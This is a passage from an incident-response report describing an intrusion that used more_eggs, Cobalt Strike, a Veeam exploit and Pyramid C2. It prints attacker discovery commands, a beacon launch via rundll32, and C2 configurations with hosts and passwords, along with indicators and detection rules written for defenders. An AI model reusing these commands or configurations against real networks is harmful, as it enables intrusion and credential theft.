We never observed any interaction with the created shadow copy. It’s unclear why the threat actor initiated this command. A hypothesis to why a shadow volume would be created, would be to extract credentials via local saved stores (SAM hives for example as this was not a Domain Controller).

There is a an identical ‘vssadmin’ command detailed on various Red Team tutorials ([https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin))

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_042.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_042.png)

## [Discovery](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#discovery)

Initial discovery actions started around 10 minutes after the initial execution of the malware. Standard Windows utilities were used:

```
cmd /v /c nltest /trusted_domains > "%TEMP%\22041.txt" 2>&1
cmd /v /c net group /domain "Domain Admins" > "%TEMP%\51362.txt" 2>&1
cmd /v /c whoami /upn > "%TEMP%\26906.txt" 2>&1
```

The threat actor later used the Cobalt Strike beacon to execute numerous other discovery commands:

```
%WINDIR%\system32\cmd.exe /C query session 
%WINDIR%\system32\cmd.exe /C nslookup 
%WINDIR%\system32\cmd.exe /C ping -n 1 <DOMAIN>
%WINDIR%\system32\cmd.exe /C net usre REDACTED /dom 
%WINDIR%\system32\cmd.exe /C net user REDACTED /dom
```

We suspect the threat actor was using the execute-assembly function of the Cobalt Strike beacon as there were several instances of rundll32.exe that had dotNet code injected into them.

The victim organization was recording certain key ETW providers which allows us to capture the threat actor loading certain modules. The following was recorded, which highlighted the threat actor using the known enumeration tool [Seatbelt](https://github.com/GhostPack/Seatbelt) and [SharpShares](https://github.com/djhohnstein/SharpShares).

```
Microsoft-Windows-DotNETRuntimeRundown {A669021C-C450-4609-A035-5AF59AF4DF18}

Seatbelt
"EventID":153
"CommandLine":"C:\\Windows\\system32\\rundll32.exe"
"ModuleILPath":"Seatbelt"
"ManagedPdbBuildPath":"Z:\\Agressor\\github.com-GhostPack\\Seatbelt-master\\Seatbelt\\obj\\Debug\\Seatbelt.pdb"

SharpShares
"EventID":153
"CommandLine":"C:\\Windows\\system32\\rundll32.exe"
"ModuleILPath":"SharpShares"
"ManagedPdbBuildPath":"C:\\Users\\mmoser\\source\\repos\\SharpShares\\SharpShares\\obj\\Release\\SharpShares.pdb"
```

The execution of these tools generated the files seatinfo.txt and share.txt, which the threat actor viewed on host.

```
type C:\programdata\shares.txt (A list of file shares in the network)
type c:\programdata\seatinfo.txt (Output of Seatbelt)
```

Invoking SharpShares or SeatBelt (both .NET/managed applications) within an unmanaged code-based process (e.g., RunDLL32) results in the creation of a Common Language Runtime (CLR) usage log file as a side effect.

```
C:\Users\<REDACTED>\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\rundll32.exe.log
```

The presence of this file for a process such as RunDLL32.exe indicates that a .Net compiled payload has been executed. In this case we can correlate this activity to the execute-assembly event.

Once the threat actor was able to access the backup server, they ran adfind.exe to gather further information on the domain:

```
adfind.exe -f "(objectcategory=person)"
adfind.exe -f "objectcategory=computer"
adfind.exe -subnets -f (objectCategory=subnet) 
```

A network check was performed with route print followed by the creation of the following file C:\\ProgramData\\scaner.zip. Shortly after, from the unzipped contents, the threat actor executed the Soft Perfect Netscan tool:

```
C:\ProgramData\scaner\scaner\netscan.exe
```

Within the zip content, we observed that there were other previous saved scans from at least five other victim environments.

The license file accompanying netscan.exe is seen below:

```
<?xml version="1.0"?>
<network-scanner-license>
  <license>o7fOIORWqaHfRIxHI1hcovfNXqvCKPNigA+oOK8UtlSJGu342vVWzuTLsR4R0bLA9Rdh+Skt6lkYR75knjO8Uw1/5N4t9qM0CRC/xjmL/gpU2K/EZQDz7+64gTeMwzkzag3KBpDcZKwwYrqdx3kVCsDXwugDQijJ6vDTuyubTAY=</license>
  <upgrade>0</upgrade>
  <language>English</language>
  <nmap></nmap>
  <autoupdate>
    <prompt>false</prompt>
    <enabled>false</enabled>
    <lastcheck>0</lastcheck>
  </autoupdate>
</network-scanner-license>
```

Shortly after the execution of netscan.exe, we observed a sudden increase in ICMP traffic which could be identified as a ping sweep across the network. Below is a sample of network traffic that exemplifies the incremental destination IP addresses during the sweep.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_043.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_043.png)

By reviewing the compromised user’s Shellbags, we were able to identify the threat actor rummaging through the file shares of the network

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_044.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_044.png)

Local accounts were enumerated on the beachhead host, and was indicated by a number of Windows Event ID 4799 events being created, with the calling process being ‘Rundll32.exe’. After translating the CallerProcessID from hex to decimal we can correlate and confirm it as the Cobalt Strike process.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_045.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_045.png)

## [Lateral Movement](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#lateral-movement)

After creating a local administrator account by exploiting CVE-2023-27532, the threat actor moved to a Veeam backup server via Remote Desktop Protocol. Next, they pivoted again from the backup server to a second server in the environment using RDP.

As they were proxying their requests through their existing malware, their workstation name was leaked in the authentication event to reveal they were likely using Kali OS.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_046.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_046.png)

Once on the backup server the threat actor ran Cobalt Strike on the host using rundll32.exe.

```
rundll32.exe  c:\programdata\payload_cr1.dll,DllInstall
```

This beacon had the same C2 details as the one used on the beachhead host.  

An additional threat actor workstation name, PACKERP-VUDV41R, was leaked in the authentication logs from the backup server.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_047.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_047.png)

Of note, both the host names kali and PACKERP-VUDV41R were [observed in the Arctic Fox article regarding a FOG ransomware case](https://arcticwolf.com/resources/blog/lost-in-the-fog-a-new-ransomware-threat/), along with several tools mentioned in this report.

**Remote Service Creation**

After exploiting Veeam and gaining access to the backup server the threat actor obtained credentials for a domain administrator account. using this account they created a remote service on a management server and created a sqlbackup user with the same properties as the one they created on the backup server.

This activity could be observed over the network with suricata rules:

```
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
```

And locally on the remote management server, 7045 events were created followed by process events to create the user account locally on the host.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_048.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_048.png)

After performing these actions the threat actor again used RDP to access this host.

## [Command and Control](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#command-and-control)

The more\_eggs malware was the most predominate command and control traffic until the threat actor deployed Cobalt Strike to the network which was significantly higher. As highlighted in the graph below, the Pyramid C2 was only used once.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_049.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_049.png)

**more\_eggs**

The more\_eggs payload communicated with the following command and control address:

| IP | Port | Domain |
| --- | --- | --- |
| 108.174.197.15 | 443 | pin.howasit\[.\]com |

This IP address has been tracked by the DFIR [Threat Intelligence Group](https://thedfirreport.com/services/threat-intelligence/) as active since mid March 2024 through November 2024.

**Cobalt Strike**

The full beacon configuration was not recoverable however a partial configuration was picked up during a memory scan across the environment:

```
"Server":"shehasgone.com", (144.208.127[.]15)
"TargetUri":"/wp-includes/lu.png",
"License":2073085114
"Host: bing.com"
"Connection: close"
"Accept-Language: en-GB;q=0.9, *;q=0.7"
```

| Domain | shehasgone\[.\]com |
| --- | --- |
| IP | 144.208.127\[.\]15 |
| Port | 443 |
| JA3 | a0e9f5d64349fb13191bc781f81f42e1 |
| JA3s | d32d6a0ff9d52869cb6d4ab402b7306c |
| JA4 | t12d190800\_d83cc789557e\_16bbda4055b2 |
| JA4s | t120300\_c02c\_52d195ce1d92 |

This IP and domain were only seen active during March 2024 and the DFIR [Threat Intelligence Group](https://thedfirreport.com/services/threat-intelligence/) also observed the domain associated with the IP 109.104.152.24, although that address was not observed in this intrusion.

**CloudFlare Tunnels**

CloudFlared tunnels were established on two server hosts by the threat actor. One host showed persistent connections to the CloudFlare IPv4 range during the intrusion.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_050.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_050.png)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_051.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_051.png)

With DNS query requests to the following domains:

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_052.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_052.png)

**Deploying Pyramid C2**

The threat actor transferred the file python-3.10.4-embed-amd64.zip through the Cobalt Strike beacon. This zip file included a number of files, including an exploit tool for Veeam. This was dropped on the beachhead in the user writable ‘ProgramData’ folder.

The zip file was masqueraded as a Python-3.10 install package. The attacker attempted to extract the zip file contents file via PowerShell commandlets, several combinations were attempted, this ultimately failed.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_053.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_053.png)

The threat actor decided to use the Windows provided utility ‘Tar’ instead.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_054.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_054.png)

Using the Tar utility, no target destination was specified by the threat actor. As a result by default the extraction created >200 files in the Windows\\System32.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_055.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_055.png)

Undeterred, the threat actor used the 7zip command line utility that they downloaded in the ProgramData folder.

```
c:\programdata\ssh\7za.exe  x "c:\programdata\ssh\python-3.10.4-embed-amd64.zip" -y
```

Unfortunately, the threat actor made a similar error, with files (> 200) extracted to the Windows\\SysWOW64 folder location this time. This was due to their command session current directory being under C:\\Windows\\System32, with the application being 32-bit (SysWOW64).

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_056.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_056.png)

The threat actor realized the error and switched to the correct current directory of C:\\ProgramData\\SSH. They used 7za again to extract the contents (> 200 files) into the correct location.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_057.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_057.png)

A lot of file creation events were observed throughout this process (>700 files), with python files (.py extension) being created in Windows folder locations that could be unusual.

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_058.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_058.png)

Once finally uncompressed, the threat actor ran the following python file:

```
cmd.exe /C "python.exe cradle.py"
```

When analyzing the file crade.py and decoding its content, we identified it was a Pyramid beacon with the following configuration:

```
pyramid_server='172.96.139.82'
pyramid_port='80'
pyramid_user='fLCi6UsgLYKdj7Fi'
pyramid_pass='Q6V26bKG68nLJ4T3UXkEFLJYsHvKgLVi'
encryption='chacha20'
encryptionpass='TestPass1'
chacha20IV=b'12345678'
pyramid_http='http'
encode_encrypt_url='/login/'
pyramid_module='base-bof_nanodump.py'
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
```

The IP address used for this C2 framework has been spotted sporadically by the DFIR [Threat Intelligence Group](https://thedfirreport.com/services/threat-intelligence/) with activity in March, July, and September of 2024.

## [Timeline](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#timeline)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_059_01.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_059_01.png)

![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_060_1.png)

## [Indicators](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#indicators)

### Atomic

```
# TA4557 Resume Lure
johnshimkus[.]com

# Other Identified TA4557 Resume Lure Pages
annetterawlings[.]com
mitchellspearman[.]com
mikedecook[.]com
davidopkins[.]com
markqualman[.]com
julienolsson[.]com
wlynch[.]com
johncboins[.]com
christianvelour[.]com
lisasierra[.]com
mikedecook[.]com
jacksallay[.]com

# more_eggs
pin.howasit[.]com
108.174.197[.]15

# Cobalt Strike
shehasgone[.]com
144.208.127[.]15

# Pyramind
172.96.139[.]82

# Computer Name
kali
PACKERP-VUDV41R
```

### Computed

```
Name: John Shimkus.zip
Size: 17421 bytes (17 KiB)
SHA256: ffc89a2026fa2b2364dd180ede662fa4ac161323388f3553b6d6e4cb2601cb1f

Name: John-_Shimkus.lnk
Size: 5977 bytes (5.84 kB)
SAH256: b56d2e095dc6c2171e461ca737cbdc0a35de7f4729b31fe41258f9cbd81309a1

Name: 31765.ocx
Size: 236544 bytes (231 KiB)
SHA256: 408f1f982bef7ab5a79057eec4079e5e8d87a0ee83361c79469018b791c03e8f

Name: VeeamHax.exe
Size: 7680 bytes (7 KiB)
SHA256: aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d

Name: AdFind.exe
Size: 2195968 bytes (2144 KiB)
SHA256: 4b8be22b23cd9098218a6f744baeb45c51b6fad6a559b01fe92dbb53c6e2c128

Name: cloudflared-windows-amd64.exe
Size: 62660475 bytes (59 MiB)
SHA256: 4569c869047a092032f6eac7cf0547591a03a0d750a6b104a606807ea282d608

Name: cloudflared-windows-amd64.msi
Size: 18305536 bytes (17 MiB)
SHA256: a26379ad2eb9de44691da254182ca65fb32596fe1217fe4fbddb173f361a0a9b

Name: payload_cr1.dll (Cobalt Strike)
Size: 236544 bytes (231 KiB)
SHA256: 408f1f982bef7ab5a79057eec4079e5e8d87a0ee83361c79469018b791c03e8f

Name: netscan.exe
Size: 16047672 bytes (15 MiB)
SHA256: a8a7fdbbc688029c0d97bf836da9ece926a85e78986d0e1ebd9b3467b3a72258
```

**Additional Indicators provided by Proof Point**

```
File Name	John__Shimkus.lnk
SHA256	95634a5c6a8290aaa9d287f28c7d22b3b7ca1cf974339fc89ea4d542fa2ec45a

File Name	Resume - John Shimkus.pdf
File Size	259866 bytes
File Type	PDF document, version 1.7
MD5	987ad23508239b58739279048cb850d5
SHA1	62ea63b720556bda73eaf95be7a282193d19aa4d
SHA256	fe63fdf34d66f1658e2c9227ac84adffaa2cbb8b689999d4d1ebc733fc5f0fce

File name	5477CA40.txt
Associated Filenames	
C:\ProgramData\Microsoft\5477CA40.txt
File Size	896 bytes
MD5	14c72c6c628104de0a93df124caa3e4a
SHA1	03bd5fa3fa4b06190b26762c4ea7b4e6ac615819
SHA256	bd3df53a397af4fe5e1441b2c91a6149bac9d26c94e46de9dbcbfa9b8647a935

File name	2A2052FAA08D525.txt
Associated Filenames	
C:\ProgramData\Microsoft\2A2052FAA08D525.txt
File Size	1745 bytes
MD5	6a0ddc6b06db8f7fef1e8934347d150d
SHA1	6a8fed99d66e84524fc75c7bfe003dea750dab11
SHA256	29bc115b5ae8cf19578c1c6a6743c3e53b9247d8eb6c556bc9d056994c58835b

File name	16304.dll
Associated Filenames	
C:\Users\User\AppData\Roaming\Microsoft\16304.dll
File Size	258560 bytes
File Type	PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
MD5	bace25f5a53a4e6cde31fe2ca2bc39a9
SHA1	ac6521fa3b00f4e70ffb97ee1dfa895097d01dc8
SHA256	757e297137e8ed21622297ae8885740b5beb09bc07141cf8ce7b24dbd95bdaf0

File name	495D3BB0FEC9.txt
Associated Filenames	
C:\ProgramData\Microsoft\495D3BB0FEC9.txt
File Size	77881 bytes
MD5	6886f4cce4041cf27dff8e2ecfbfd38d
SHA1	b68eaed2a653ca79b8ef0b261eb4047ced6e16f4
SHA256	6f12dc858631cf90cd4fef57fbb52675b8649d777c7f86384c6535da0a59ad67

File name	60052.txt
Associated Filenames	
C:\Windows\Temp\60052.txt
C:\Users\User\AppData\Local\Temp\48744.txt
File Size	80 bytes
MD5	4fdbae9775a20dc33dec05e408c2a2ad
SHA1	3eaa51632f2beae23d9811b9ff91e31c91092177
SHA256	228cd867898ab0b81d31212b2da03cc3e349c9000dfb33e77410e2937cea8532

File name		kbbwi9hgjw
File Size	357808 bytes
SHA256	cbe1f43ad7a19c97a521a662dd406a3fb345ae919271cefc694a71e55fe163f5
```

## [Detections](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#detections)

### Network

```
ETPRO MALWARE Possible More_eggs Connectivity Check M2
ET INFO DNS Query to Cloudflare Tunneling Domain (argotunnel .com)
ET INFO Observed Cloudflare Tunneling Domain (argotunnel .com in TLS SNI)
ET INFO SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ETPRO MALWARE App Whitelist Bypass Via Com Scriptlet Inbound
```

### Sigma

DFIR Public Rules Repo:

```
50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery
```

DFIR Private Rules:

```
28702b61-c530-49f8-9d22-de15166ab9c5 : Detection of Modified VeeamHax Tool Usage
9b3a37ab-c97a-451b-94e8-09dae5e759e7 : Detecting the use of a workstation named 'kali' in the network
275ec3d1-47c1-4fa9-a001-fa4feeb5e4d4 : Detect Disabling Windows Defender Threat Protection
855a4c48-fdd5-4283-ba4b-c5ec167e4128 : Detection of Suspicious msxsl.exe Command Line Activity
8c2dc958-3385-4ac7-acdb-eeecafa7944e : Detection of Suspicious IPv6 Address in RDP Sessions
3b4e4f8d-50e3-48c8-a92b-fba48d5af7a1 : Execution IE4uinit.exe to Sideload Malicious Binaries
```

Sigma Repo:

```
a7c3d773-caef-227e-a7e7-c2f13c622329 : Bad Opsec Defaults Sacrificial Processes With Improper Arguments
9a019ffc-3580-4c9d-8d87-079f7e8d3fd4 : Cloudflared Tunnel Execution
a1d9eec5-33b2-4177-8d24-27fe754d0812 : Cloudflared Tunnels Related DNS Requests
d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe
5a105d34-05fc-401e-8553-272b45c1522d : CobaltStrike Service Installations - System	
bf361876-6620-407a-812f-bfe11e51e924 : Compressed File Extraction Via Tar.EXE
0eb46774-f1ab-4a74-8238-1155855f2263 : Disable Windows Defender Functionalities Via Registry Keys
36e037c4-c228-4866-b6a3-48eb292b9955 : DNS Query Request By Regsvr32.EXE
9c14c9fa-1a63-4a64-8e57-d19280559490 : Invoke-Obfuscation Via Stdin
9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0 : Msxsl.EXE Execution
c7e91a02-d771-4a6d-a700-42587e0b1095 : Network Connection Initiated By Regsvr32.EXE
cd219ff3-fa99-45d4-8380-a7d15116c6dc : New User Created Via Net.EXE
5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE
6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca : Potentially Suspicious Child Process Of Regsvr32
6385697e-9f1b-40bd-8817-f4a91f40508e : PowerShell Base64 Encoded Invoke Keyword
9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution
02d1d718-dd13-41af-989d-ea85c7fab93f : Rare Remote Thread Creation By Uncommon Source Image
9525dc73-0327-438c-8c04-13c0e037e9da : Regsvr32 Execution From Potential Suspicious Location
c3a99af4-35a9-4668-879e-c09aeb4f2bdf : Rundll32 Execution With Uncommon DLL Extension
1775e15e-b61b-4d14-a1a3-80981298085a : Rundll32 Execution Without CommandLine Parameters
8e0bb260-d4b2-4fff-bb8d-3f82118e6892 : Suspicious CMD Shell Output Redirect
fff9d2b7-e11c-4a69-93d3-40ef66189767 : Suspicious Copy From or To System Directory
e0b06658-7d1d-4cd3-bf15-03467507ff7c : Suspicious DotNET CLR Usage Log Artifact
fb843269-508c-4b76-8b8d-88679db22ce7 : Suspicious Execution of Powershell with Base64
d95de845-b83c-4a9a-8a6a-4fc802ebf6c0 : Suspicious Group And Account Reconnaissance Activity Using Net.EXE
dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c : Suspicious Scheduled Task Creation via Masqueraded XML File
b5de0c9a-6f19-43e0-af4e-55ad01f550af : Unsigned DLL Loaded by Windows Utility
8de1cbe8-d6f5-496d-8237-5f44a721c7a0 : Whoami.EXE Execution Anomaly
c30fb093-1109-4dc8-88a8-b30d11c95a5d : Whoami.EXE Execution With Output Option
b28e58e4-2a72-4fae-bdee-0fbe904db642 : Windows Defender Real-time Protection Disabled
3a6586ad-127a-4d3b-a677-1e6eacdf8fde : Windows Shell/Scripting Processes Spawning Suspicious Programs
```

### Yara

[https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27899/27899.yar](https://github.com/The-DFIR-Report/Yara-Rules/blob/main/27899/27899.yar)

External Rules:

## [MITRE ATT&CK](https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/?utm_source=tldrinfosec#mitre)

[![](https://thedfirreport.com/wp-content/uploads/2024/12/27899_061.png)](https://thedfirreport.com/wp-content/uploads/2024/12/27899_061.png)

```
Browser Information Discovery - T1217
Create Account - T1136
Credentials from Password Stores - T1555
Disable or Modify Tools - T1562.001
Domain Account - T1087.002
Domain Groups - T1069.002
Domain Trust Discovery - T1482
Exploitation for Privilege Escalation - T1068
File and Directory Discovery - T1083
File Deletion - T1070.004
Ingress Tool Transfer - T1105
Local Account - T1087.001
Local Groups - T1069.001
LSASS Memory - T1003.001
Malicious File - T1204.002
Network Service Discovery - T1046
Network Share Discovery - T1135
Phishing - T1566
PowerShell - T1059.001
Protocol Tunneling - T1572
Proxy - T1090
Python - T1059.006
Remote Desktop Protocol - T1021.001
Remote System Discovery - T1018
Scheduled Task - T1053.005
Security Software Discovery - T1518.001
```